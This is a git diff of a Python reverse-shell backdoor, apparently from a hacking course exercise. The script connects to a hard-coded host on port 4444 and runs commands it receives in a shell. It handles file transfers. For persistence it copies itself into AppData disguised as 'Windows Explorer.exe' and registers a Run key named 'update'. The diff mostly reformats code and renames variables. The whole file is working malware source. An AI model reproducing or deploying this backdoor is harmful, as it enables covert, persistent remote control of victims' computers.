@@ -1,10 +1,10 @@
 #!/usr/bin/env python
 import base64
 import os
-import shutil
 import socket
 import subprocess, json
 import sys
+import shutil
 
 class Backdoor:
     def __init__(self, ip, port):
@@ -12,13 +12,14 @@ class Backdoor:
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((ip, port))
     def become_persistent(self):
-        file_location= os.environ["appdata"] + "\\Windows Explorer.exe"
-        if not os.path.exists(file_location):
-            shutil.copyfile(sys.executable,file_location)
-            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d"' + file_location+'"',shell=True)
+        evil_file_location=os.environ["appdata"]+ "\\Windows Explorer.exe"
+        if not os.path.exists(evil_file_location):
+            shutil.copyfile(sys.executable,evil_file_location)
+            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d"' + evil_file_location + '"',shell=True)
     def execute_system_command(self, command):
-        DEVNULL=open(os.devnull, 'wb')
-        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL,stdin=subprocess.DEVNULL)
+        DEVNULL=open(os.devnull,'wb')
+        return subprocess.check_output(command,shell=True,stderr=DEVNULL,stdin=DEVNULL)
+
     def reliable_send(self,data):
         json_data=json.dumps(data)
         self.connection.send(json_data)
@@ -51,7 +52,7 @@ class Backdoor:
             try:
                 if command[0] == "exit":
                     self.connection.close()
-                    sys.exit()
+                    exit()
                 elif command[0] == "cd" and len(command) > 1:
                     command_result = self.change_directory(command[1])
                 elif command[0] == "download":
@@ -67,3 +68,7 @@ class Backdoor:
 
 backdoor = Backdoor("192.168.101.133", 4444)
 backdoor.run()
+#try:
+#    return subprocess.check_output(command, shell=True)
+#except subprocess.CalledProcessError:
+#    return "error during command execution"
